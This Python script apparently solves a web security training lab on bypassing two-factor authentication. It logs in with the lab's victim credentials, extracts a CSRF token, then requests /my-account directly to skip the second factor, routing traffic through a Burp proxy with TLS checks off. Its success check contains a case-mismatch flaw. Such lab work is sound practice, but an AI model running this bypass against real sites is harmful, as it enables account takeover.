import requests
import sys
import re
import urllib3

# Disable the warning in urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set proxy to be burp
proxies = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def normalize_url(url: str) -> str:
    # ensure URL has a scheme and no trailing slash
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip('/')

def access_target_account(s, url):
    # prepare login URL and credentials
    login_url = f"{url}/login"

    # GET login page first (to retrieve CSRF token / cookies)
    print(f"[-] Attempting to login to {login_url} with username 'carlos' and password 'montoya'")
    r_get = s.get(login_url, verify=False)
    print(f"[-] GET {login_url} status: {r_get.status_code}")
    # verbose: show what we received (helpful when Burp returns its own HTML)
    # try to extract CSRF token if present
    csrf_token = None
    m = re.search(r"<input[^>]+name=\"(csrf_token|csrf|authenticity_token)\"[^>]*value=\"([^\"]+)\"", r_get.text, re.I)
    if m:
        csrf_token = m.group(2)
        print(f"[-] Found CSRF token: {csrf_token}")

    # build login data
    login_data = {"username": "carlos", "password": "montoya"}
    if csrf_token:
        # try common field names
        # prefer the one that matched group(1)
        field = m.group(1)
        login_data[field] = csrf_token

    # make the POST request to login
    r = s.post(login_url, data=login_data, verify=False, allow_redirects=True)
    print(f"[-] POST {login_url} status: {r.status_code}")
    # print a short preview of response to help debugging
    preview = r.text[:800]
    print(preview)

    # Now check the my-account page
    my_account_url = f"{url}/my-account"
    r2 = s.get(my_account_url, verify=False)
    print(f"[-] GET {my_account_url} status: {r2.status_code}")
    if ("Your username is: carlos" in r2.text.lower() or "log out" in r2.text):
        print("[+] Successfully logged in as carlos and bypassed 2FA")
    else:
        print("[-] Failed to bypass 2FA")

def main():
    print("[-] Debug , ", sys.argv)

    if len(sys.argv) != 2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(1)
    
    s = requests.session()
    s.proxies = proxies
    url = normalize_url(sys.argv[1])
    access_target_account(s, url)


if __name__ == "__main__":
    main()
     
    